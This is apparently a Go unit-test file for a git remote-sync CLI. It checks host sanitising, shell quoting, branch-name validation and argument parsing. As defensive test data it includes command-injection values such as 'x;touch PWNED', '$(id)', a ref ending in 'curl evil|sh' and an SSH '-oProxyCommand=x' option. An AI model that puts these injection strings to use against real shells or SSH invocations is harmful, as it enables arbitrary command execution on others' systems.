package cli

import (
	"bytes"
	"reflect"
	"strings"
	"testing"
)

func TestRemoteNames(t *testing.T) {
	// A changed host is the cleaned form, a dash, and an 8-character hash.
	changed := map[string]string{
		"me@box":         "me-box",
		"a.b":            "a-b",
		"gpu 1/2":        "gpu-1-2",
		"host:2222":      "host-2222",
		"me@box.example": "me-box-example",
		"é":              "-",
	}
	for host, base := range changed {
		got := sanitizeHost(host)
		if !strings.HasPrefix(got, base+"-") || len(got) != len(base)+9 {
			t.Errorf("sanitizeHost(%q) = %q, want %q plus an 8-character hash", host, got, base)
		}
	}
	for _, host := range []string{"box", "me-box", "a_b-D9"} {
		if got := sanitizeHost(host); got != host {
			t.Errorf("sanitizeHost(%q) = %q, want no change", host, got)
		}
	}
	if sanitizeHost("me@box") == sanitizeHost("me-box") {
		t.Error("me@box and me-box collide")
	}
	if got := remoteName("me@box", "proj-1a2b3c4d"); got != "airlock-"+sanitizeHost("me@box")+"-proj-1a2b3c4d" {
		t.Errorf("remoteName = %q", got)
	}
	if remoteName("box", "p-1") == remoteName("box", "q-1") {
		t.Error("two projects share a remote name")
	}
	if got := remoteURL("me@box", "proj-1a2b3c4d"); got != "me@box:airlock-remote/proj-1a2b3c4d" {
		t.Errorf("remoteURL = %q", got)
	}
}

func TestCheckoutScriptAndRefspec(t *testing.T) {
	if got, want := checkoutScript("airlock-remote/p", "feat/x"), "cd airlock-remote/p && git checkout -q feat/x --"; got != want {
		t.Errorf("checkoutScript = %q, want %q", got, want)
	}
	if got, want := checkoutScript("airlock-remote/p", "it's"), `cd airlock-remote/p && git checkout -q 'it'\''s' --`; got != want {
		t.Errorf("checkoutScript quoting = %q, want %q", got, want)
	}
	if got := pushRefspec("feat/x"); got != "refs/heads/feat/x:refs/heads/feat/x" {
		t.Errorf("pushRefspec = %q", got)
	}
}

func TestRemoteShWrapsScripts(t *testing.T) {
	if got, want := remoteSh("cd a && git status"), "sh -c 'cd a && git status'"; got != want {
		t.Errorf("remoteSh = %q, want %q", got, want)
	}
	if got := remoteSh("echo 'x'"); got != `sh -c 'echo '\''x'\'''` {
		t.Errorf("remoteSh quoting = %q", got)
	}
}

func TestCheckBranchName(t *testing.T) {
	for _, ok := range []string{"main", "feat/x", "x;touch PWNED", "a$(id)", "`id`"} {
		if err := checkBranchName(ok); err != nil {
			t.Errorf("checkBranchName(%q): %v", ok, err)
		}
	}
	for _, bad := range []string{"", "-x", "+foo", "--force"} {
		if err := checkBranchName(bad); err == nil {
			t.Errorf("checkBranchName(%q) accepted", bad)
		}
	}
}

func TestBranchFromRef(t *testing.T) {
	if b, ok := branchFromRef("refs/heads/feat/x\n"); !ok || b != "feat/x" {
		t.Errorf("branchFromRef = %q, %v", b, ok)
	}
	if _, ok := branchFromRef(""); ok {
		t.Error("empty output read as a branch")
	}
	if _, ok := branchFromRef("0123abc\n"); ok {
		t.Error("a detached HEAD read as a branch")
	}
}

func TestParseVersionOutput(t *testing.T) {
	for in, want := range map[string]string{
		"airlock 0.1.0\n":                     "0.1.0",
		"  airlock v1.2  ":                    "v1.2",
		"Welcome to the box\nairlock 0.1.0\n": "0.1.0",
	} {
		if got, ok := parseVersionOutput(in); !ok || got != want {
			t.Errorf("parseVersionOutput(%q) = %q, %v; want %q", in, got, ok, want)
		}
	}
	for _, in := range []string{"", "0.1.0", "airlock 0.1.0\nmotd after"} {
		if _, ok := parseVersionOutput(in); ok {
			t.Errorf("parseVersionOutput(%q) accepted", in)
		}
	}
}

func TestMovedBranches(t *testing.T) {
	before := map[string]string{"main": "aaa", "gone": "ggg", "same": "sss"}
	after := map[string]string{"main": "bbb", "same": "sss", "new": "nnn"}
	want := []movedBranch{
		{Name: "main", Old: "aaa", New: "bbb"},
		{Name: "new", New: "nnn"},
	}
	if got := movedBranches(before, after); !reflect.DeepEqual(got, want) {
		t.Errorf("movedBranches = %+v, want %+v", got, want)
	}
	if got := movedBranches(after, after); got != nil {
		t.Errorf("nothing moved, got %+v", got)
	}
}

func TestParseRemoteRefs(t *testing.T) {
	out := "1111111111111111111111111111111111111111 refs/remotes/airlock-box/HEAD\n" +
		"2222222222222222222222222222222222222222 refs/remotes/airlock-box/main\n" +
		"3333333333333333333333333333333333333333 refs/remotes/airlock-box/feat/x\n" +
		"\n" +
		"4444444444444444444444444444444444444444 refs/remotes/other/main\n"
	want := map[string]string{
		"main":   "2222222222222222222222222222222222222222",
		"feat/x": "3333333333333333333333333333333333333333",
	}
	if got := parseRemoteRefs(out, "airlock-box"); !reflect.DeepEqual(got, want) {
		t.Errorf("parseRemoteRefs = %v, want %v", got, want)
	}
}

func TestShellJoinQuotesHostileNames(t *testing.T) {
	got := shellJoin("git", "log", "--oneline", "main..airlock-x/x;curl evil|sh")
	if got != "git log --oneline 'main..airlock-x/x;curl evil|sh'" {
		t.Errorf("shellJoin = %q", got)
	}
	if got := shellJoin("a$(id)", "`id`"); got != "'a$(id)' '`id`'" {
		t.Errorf("shellJoin backticks = %q", got)
	}
}

func TestCleanText(t *testing.T) {
	if got := safeText("ok\x1b[2Jline\x07\tend\n"); got != "ok[2Jline\tend\n" {
		t.Errorf("safeText = %q", got)
	}
	var buf bytes.Buffer
	n, err := cleanWriter{&buf}.Write([]byte("a\rb\x1bc\n"))
	if err != nil || n != 6 || buf.String() != "abc\n" {
		t.Errorf("cleanWriter = %q, %d, %v", buf.String(), n, err)
	}
}

func TestShortSHA(t *testing.T) {
	if got := shortSHA("0123456789abcdef"); got != "0123456" {
		t.Errorf("shortSHA = %q", got)
	}
	if got := shortSHA("abc"); got != "abc" {
		t.Errorf("shortSHA short = %q", got)
	}
}

func TestParseRemoteArgs(t *testing.T) {
	type got struct{ sub, host, path string }
	good := map[string]struct {
		rest []string
		want got
	}{
		"push":           {[]string{"push", "box"}, got{"push", "box", ""}},
		"pull with path": {[]string{"pull", "me@box", "/src/p"}, got{"pull", "me@box", "/src/p"}},
		"open":           {[]string{"open", "box", "p"}, got{"open", "box", "p"}},
	}
	for name, c := range good {
		sub, host, path, err := parseRemoteArgs(c.rest)
		if err != nil || (got{sub, host, path}) != c.want {
			t.Errorf("%s: %q, %q, %q, %v; want %+v", name, sub, host, path, err, c.want)
		}
	}
	for _, bad := range [][]string{
		nil,
		{"push"},
		{"sync", "box"},
		{"push", ""},
		{"push", "-oProxyCommand=x"},
		{"push", "box with space"},
		{"push", "host:22"},
		{"push", "box/x"},
		{"push", `box\x`},
		{"push", "box", "p", "extra"},
	} {
		if _, _, _, err := parseRemoteArgs(bad); err == nil {
			t.Errorf("%q accepted", bad)
		}
	}
}
